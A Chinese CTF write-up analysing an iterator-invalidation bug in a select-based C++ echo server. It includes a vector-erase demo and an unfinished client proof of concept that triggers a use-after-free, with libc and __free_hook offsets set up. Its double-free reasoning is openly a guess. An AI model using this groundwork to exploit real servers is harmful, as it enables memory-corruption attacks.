该题目其实是一个魔改的回声服务器，具体的代码框架如下：

模块化，将Listen，accept，read，write逐一模块化，开放21337端口供client连接。如果有client连接，就将其fd（文件描述符）放入vector容器，遍历其容器，遇见可读事件就进行read，接着进行回射。

```c
#include <vector>
#include <fcntl.h>
#include <iostream>

#include <err.h>

#include <time.h>

#include <vector>

#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#include <sys/select.h>

#include <sys/time.h>

#include <stdio.h>

enum Direction {
  DIR_IN,
  DIR_OUT
};

struct ClientCtx {
  int fd;
  Direction dir;
  std::string rd_buf;
  std::string wr_buf;
};

bool running = true;
std::vector<ClientCtx> clients;

int listen_on(int port) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    err(1, "socket");
  }
  int flag = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag)) != 0) {
    err(1, "setsockopt");
  }
  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INADDR_ANY;
  addr.sin_port = htons(port);
  if (bind(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr)) != 0) {
    err(1, "bind");
  }
  if (listen(fd, 100) != 0) {
    err(1, "listen");
  }
  if (fcntl(fd, F_SETFL, O_NONBLOCK) != 0) {
    err(1, "fcntl");
  }
  return fd;
}

void handle_new_connections(int listen_fd) {
  for (;;) {
    int fd = accept(listen_fd, nullptr, nullptr);
    if (fd < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        break;
      }
      err(1, "accept");
    }
    if (fcntl(fd, F_SETFL, O_NONBLOCK) != 0) {
      err(1, "fcntl");
    }
    clients.push_back({
      .fd = fd,
      .dir = DIR_IN,
    });
    clients.back().wr_buf += "Hello, [" + std::to_string(fd) + "]\n";
  }
}

bool handle_read(ClientCtx& client) {
  char buf[128];
  for (;;) {
    int r = read(client.fd, buf, sizeof(buf)); // 客户端句柄内容读到buf
    if (r < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        break;
      }
      err(1, "read %d", client.fd);
    }
    if (r == 0) {
      return false;
    }
    if (r > 0) {
      client.rd_buf.append(buf, r); // 内容压入容器里的read_buf
      auto eol = client.rd_buf.find('\n');
      if (eol != std::string::npos) {
        if (client.rd_buf.substr(0, eol).find("exit") != std::string::npos) {
          running = false;
        }
        client.wr_buf += client.rd_buf.substr(0, eol+1);
        client.rd_buf = client.rd_buf.substr(eol+1);
        client.dir = DIR_OUT;
      }
    }
  }
  return true;
}

bool handle_write(ClientCtx& client) {
  for (;;) {
    if (client.wr_buf.empty()) {
      client.dir = DIR_IN;
      break;
    }
    // 回写到客户端，client.fd应该就是客户端的文件描述符
    int written = write(client.fd, &client.wr_buf[0], client.wr_buf.size());
    if (written < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        break;
      }
      err(1, "write");
    }
    if (written == 0) {
      return false;
    }
    if (written > 0) {
      client.wr_buf = client.wr_buf.substr(written);
    }
  }
  return true;
}

int main() {
  std::cout << std::unitbuf;
  std::cerr << std::unitbuf;
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // main listening socket
  int listen_fd = listen_on(21337); // listen_fd是一个文件描述符
  std::cout << "Listening on 21337" << std::endl;

  fd_set readset;
  fd_set writeset;

  while (running) {

    FD_ZERO(&writeset); // 将写队列清空
    FD_ZERO(&readset); // 将读队列清空

    FD_SET(listen_fd, &readset); // 把监听队列和读队列加入队列
    int max_fd = listen_fd;

    for (const ClientCtx& client : clients) {
      if (client.dir == DIR_OUT) {
        FD_SET(client.fd, &writeset);
      } else {
        FD_SET(client.fd, &readset);
      }
      max_fd = std::max(max_fd, client.fd);
    }

    // 此处配合while (true)实现了多客户连接
    int ret = select(max_fd + 1, &readset, &writeset, nullptr, nullptr);
    if (ret > 0) {                    // 如果当前有多个或一个事件被检测到
      if (FD_ISSET(listen_fd, &readset)) {
        handle_new_connections(listen_fd);  // 建立连接，同时将相应的事件压入容器
      }

      for (auto it = clients.begin(), end = clients.end(); it != end; ++it) {
        ClientCtx& client = *it;
        const int fd = client.fd;
        
        if (FD_ISSET(fd, &readset)) {
          if (!handle_read(client)) {
            close(fd);
            it = clients.erase(it);
            continue;
          }
        } else if (FD_ISSET(fd, &writeset)) {
          if (!handle_write(client)) {
            close(fd);
            it = clients.erase(it);
            continue;
          }
        }
      }

    } else if (ret < 0 && errno != EINTR) {
      err(1, "select");
    }
  }
}

```

可以看出，漏洞点产生在这块地方，遍历所有客户端，但是又在里面执行了erase，这就导致了容器内部的元素会发生位移，可for循环中仍然使用it来进行遍历且begin和end都设置了变量来保存，这就会产生一个新的迭代器，使得原迭代器无效，而使用原迭代器来进行遍历，会产生越界错误

```c
 for (auto it = clients.begin(), end = clients.end(); it != end; ++it) {
        ClientCtx& client = *it;
        const int fd = client.fd;
        
        if (FD_ISSET(fd, &readset)) {
          if (!handle_read(client)) {
            close(fd);
            it = clients.erase(it);
            continue;
          }
        } else if (FD_ISSET(fd, &writeset)) {
          if (!handle_write(client)) {
            close(fd);
            it = clients.erase(it);
            continue;
          }
        }
      }
```

造成的结果是奇数的元素全部被留下

poc如下：

```c
#include <iostream>
#include <vector>
using namespace std;

vector<int> vec;

int pushvec(){
    for (int i = 0; i < 10; i++)
        vec.push_back(i);
}

int show_vec(){
    for (int i = 0; i < vec.size(); i++) {
        printf ("no.%d  %x\n" ,vec[i],&vec[i]);
    }
}

int erasevec(){
    for (auto it = vec.begin(), end = vec.end(); it != end; it++){
        vec.erase(it);
        show_vec();
        cout << endl;
    }

}

int main()
{
    pushvec();
    show_vec();
    cout << endl;
    erasevec();
}
---------------------------------------------------------------------------------------
//下面为实验结果
no.0  751c70
no.1  751c74
no.2  751c78
no.3  751c7c
no.4  751c80
no.5  751c84
no.6  751c88
no.7  751c8c
no.8  751c90
no.9  751c94

no.1  751c70
no.2  751c74
no.3  751c78
no.4  751c7c
no.5  751c80
no.6  751c84
no.7  751c88
no.8  751c8c
no.9  751c90

no.1  751c70
no.3  751c74
no.4  751c78
no.5  751c7c
no.6  751c80
no.7  751c84
no.8  751c88
no.9  751c8c

no.1  751c70
no.3  751c74
no.5  751c78
no.6  751c7c
no.7  751c80
no.8  751c84
no.9  751c88

no.1  751c70
no.3  751c74
no.5  751c78
no.7  751c7c
no.8  751c80
no.9  751c84

no.1  751c70
no.3  751c74
no.5  751c78
no.7  751c7c
no.9  751c80
    
然后从这里开始越界操作，clion发生报错
```

接着更深入的漏洞点在于vector erase会触发copy吗，copy又会触发std：：string的operation =，这里面调用了swap，就把chunk的指针交换了，就实现double free？（猜测，这里没调出来）

client端poc:

加上getchar()就正常执行，删去就是uaf（为什么？）

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <arpa/inet.h>

#define OFFSET_HEAP 0x12f50
#define OFFSET_LIBC 0x1ec0d0
#define OFFSET_FREE_HOOK 0x1eeb28
#define OFFSET_SYSTEM 0x55410

#define yield() usleep(1000)

int conn() {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        puts("socket creation failed...");
        exit(0);
    }
    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(21337);

    if (connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) {
        puts("connection with the server failed...");
        exit(0);
    }

    return sockfd;
}

int main() {
    int c1, c2;
    
    c1 = conn();
    yield();
    c2 = conn();
    puts("write1");
    getchar();
    write(c1, "AAAA...", 0x20);
    puts("write2");
    getchar();
    write(c2, "BBBB...", 0x20);
    yield();
    
    puts("write3");
    getchar();
    write(c2, "uafw", 4);
    puts("close");
    getchar();
    close(c1);
    yield();
    
    return 0;
}

```

